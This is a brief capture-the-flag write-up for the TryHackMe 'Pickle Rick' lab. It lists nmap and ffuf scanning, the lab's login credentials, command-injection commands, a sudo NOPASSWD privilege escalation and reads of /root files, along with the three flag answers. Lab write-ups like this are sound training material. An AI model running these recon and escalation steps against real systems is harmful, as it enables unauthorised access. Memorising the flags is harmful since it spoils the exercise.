# THM - Pickle Rick
- Command Injection.
- target IP: `10.10.181.166`

## Scanning
```bash
→ sudo ping -c 4 10.10.181.166
# Check the connection of the target IP.

→ nmap -sC -sV -oN nmap.txt 10.10.181.166
```


## Enumeration
```bash
→ ffuf -w /opt/SecLists/Discovery/Web-Content/raft-large-files.txt -u http://10.10.181.166/
FUZZ -c -mc 200
```
- Login page.
    - Username: `R1ckRul3s`
    - Password: `Wubbalubbadubdub` 

```bash
pwd
# /var/www/html

less Sup3rS3cretPickl3Ingred.txt 
# mr. meeseek hair
```
```bash
sudo -l
# Can privilege escalation it.
# (ALL) NOPASSWD: ALL

cat /home/rick/second*
# 1 jerry tear
```
```bash
sudo less /root/3rd.txt 
# fleeb juice
```